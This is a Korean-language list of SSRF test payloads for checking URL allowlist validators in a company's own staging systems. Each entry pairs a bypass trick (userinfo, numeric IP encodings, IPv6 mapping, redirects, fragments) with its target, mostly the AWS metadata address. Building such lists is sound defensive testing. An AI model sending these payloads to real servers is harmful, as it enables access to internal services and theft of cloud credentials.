# ssrf_payloads.txt — SSRF 파서 불일치 검증용 페이로드 목록
#
# 용도: 자사 스테이징·개발 환경의 URL 입력 지점이 "문자열 검사"에 의존하는지 확인한다.
# 금지: 외부(제3자) 서비스에 대한 무단 시험. 허가 없는 스캔은 법적 문제가 된다.
#
# 표기: 페이로드 | 도달 목적지 | 뚫리는 검사 | 메모
#
# 공통 준비:
#   - 허용 목록에 api.trusted.com 이 들어 있는 엔드포인트를 대상으로 한다.
#   - 응답 코드·본문·에러 메시지를 관찰한다(내부 응답이 새면 블라인드가 아니다).
#   - 테스트 후 요청 로그를 남겨 검증기가 어느 단계에서 놓쳤는지 확인한다.

# ── ① userinfo ───────────────────────────────────────────────────────────────
https://api.trusted.com@169.254.169.254/ | AWS IMDS | @ 앞 도메인을 보는 검사 | RFC 3986에서 @ 앞은 userinfo, 뒤가 host
https://api.trusted.com:443@169.254.169.254/ | AWS IMDS | 포트까지 붙인 접두사 비교 | userinfo에 포트를 붙여 정규식을 흔든다

# ── ② 10진수 / ③ 16진수 IP ───────────────────────────────────────────────────
http://2852039166/ | 169.254.169.254 | 점 4개 형식을 기대하는 정규식 | 169*16777216 + 254*65536 + 169*256 + 254
http://0xA9FEA9FE/ | 169.254.169.254 | 10진수만 막는 규칙 | A9=169, FE=254
http://3232235521/ | 192.168.0.1 | 사설 대역 문자열만 막는 규칙 | 10진 표기는 대역 비교를 우회
http://0177.0.0.1/ | 127.0.0.1 | 점 표기만 검사 | 8진 표기(0177)
http://127.1/ | 127.0.0.1 | 4옥텟만 검사 | 축약형 루프백

# ── ④ IPv6 매핑 ──────────────────────────────────────────────────────────────
http://[::ffff:a9fe:a9fe]/ | 169.254.169.254 | IPv4 대역만 차단하는 규칙 | a9fe:a9fe = 169.254.169.254
http://[::ffff:127.0.0.1]/ | 127.0.0.1 | 위와 같음 | 라이브러리에 따라 hostname이 그대로 전달됨
http://[fd00:ec2::254]/ | AWS IMDS(IPv6) | IPv4 메타데이터만 차단 | 듀얼스택 VPC에서 유효

# ── ⑤ 리다이렉트 ─────────────────────────────────────────────────────────────
https://api.trusted.com/redirect?to=http://169.254.169.254/ | AWS IMDS | 최초 목적지만 검사 | 허용 호스트가 302로 내부를 가리키는 구성이면 성립
http://httpbin.org/redirect-to?url=http://169.254.169.254/ | AWS IMDS | 공개 리다이렉터를 경유 | 클라이언트가 리다이렉트를 따라갈 때

# ── ⑥ fragment ───────────────────────────────────────────────────────────────
https://169.254.169.254/#@api.trusted.com | AWS IMDS | # 뒤까지 문자열로 검사 | fragment는 서버로 전송되지 않는다
https://169.254.169.254/?x=api.trusted.com | AWS IMDS | query까지 문자열로 검사 | 가장 흔한 형태

# ── 같은 계열 확장 ───────────────────────────────────────────────────────────

http://169.254.169.254%2f/latest/ | AWS IMDS | 퍼센트 인코딩 미디코딩 | 파서에 따라 경로 구분자로 해석
